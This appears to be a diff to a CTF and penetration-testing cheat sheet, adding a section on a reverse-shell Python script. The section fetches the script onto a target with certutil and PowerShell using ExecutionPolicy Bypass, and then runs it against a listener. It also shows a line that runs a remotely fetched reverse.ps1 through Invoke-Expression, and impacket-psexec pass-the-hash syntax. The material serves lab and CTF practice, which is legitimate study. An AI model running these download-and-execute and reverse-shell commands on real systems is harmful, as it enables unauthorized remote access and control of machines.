@@ -640,7 +640,45 @@ $env:port=<listener port>
 Invoke-Expression (Invoke-WebRequest https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.ps1 -UseBasicParsing)
 ```
 
-### 4.6. Windows direct connection
+### 4.6. Using the [reverse.py](/reverse.py) script in this repo
+
+Python is mostly pre-installed on Linux, install Python on Windows from https://www.python.org/downloads/
+
+#### Download to kali
+
+```sh
+curl -sL --output-dir /var/www/html -O https://github.com/joetanx/ctf/raw/main/reverse.py
+```
+
+#### Download on target directly
+
+```cmd
+certutil.exe /urlcache /f /split https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.py
+```
+
+```cmd
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.py -OutFile .\reverse.py
+```
+
+```cmd
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.py','.\reverse.py')
+```
+
+#### Run the script
+
+Linux:
+
+```sh
+python3 reverse.py <listener address> <listener port>
+```
+
+Windows:
+
+```pwsh
+%PROGRAMFILES%\Python314\python.exe reverse.py <listener address> <listener port>
+```
+
+### 4.7. Windows direct connection
 
 #### evil-winrm
 
@@ -663,7 +701,7 @@ Invoke-Expression (Invoke-WebRequest https://github.com/joetanx/ctf/raw/refs/hea
 |Username/password|`impacket-psexec [$DOMAIN/]$USERNAME:$PASSWORD@$TARGET [$COMMAND]`|
 |Password hashes|`impacket-psexec -hashes $LM_HASH:$NT_HASH [$DOMAIN/]$USERNAME@$TARGET [$COMMAND]`|
 
-### 4.7. Upgrade to Full TTY
+### 4.8. Upgrade to Full TTY
 
 Certain activities like `su` will not run (error `su: must be run from a terminal`) without a terminal
 
